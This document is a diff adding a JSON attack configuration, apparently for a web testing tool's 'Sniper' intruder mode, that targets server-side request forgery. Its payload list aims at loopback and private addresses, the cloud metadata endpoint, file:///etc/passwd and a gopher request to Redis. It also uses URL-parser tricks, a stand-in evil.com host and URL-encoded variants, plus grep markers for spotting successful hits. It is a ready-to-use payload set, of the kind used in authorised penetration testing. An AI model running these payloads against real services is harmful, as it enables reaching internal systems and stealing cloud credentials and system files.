@@ -1,0 +1,41 @@
+{
+  "attackType": "Sniper",
+  "positions": [
+    {
+      "position": "§",
+      "type": "simple"
+    }
+  ],
+  "payloads": [
+    "http://127.0.0.1",
+    "http://localhost",
+    "http://169.254.169.254/latest/meta-data/",
+    "http://192.168.0.1",
+    "http://10.0.0.1",
+    "http://evil.com",
+    "http://example.com@127.0.0.1",
+    "http://localhost#evil.com",
+    "file:///etc/passwd",
+    "gopher://127.0.0.1:6379/_PING",
+    "http%3A%2F%2F127.0.0.1",
+    "http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F",
+    "file%3A%2F%2F%2Fetc%2Fpasswd",
+    "gopher%3A%2F%2F127.0.0.1%3A6379%2F_PING"
+  ],
+  "payloadProcessing": [
+    {
+      "type": "URL-encode"
+    },
+    {
+      "type": "Double URL-encode"
+    }
+  ],
+  "grep": [
+    "metadata",
+    "internal",
+    "EC2",
+    "error",
+    "localhost",
+    "127.0.0.1"
+  ]
+}
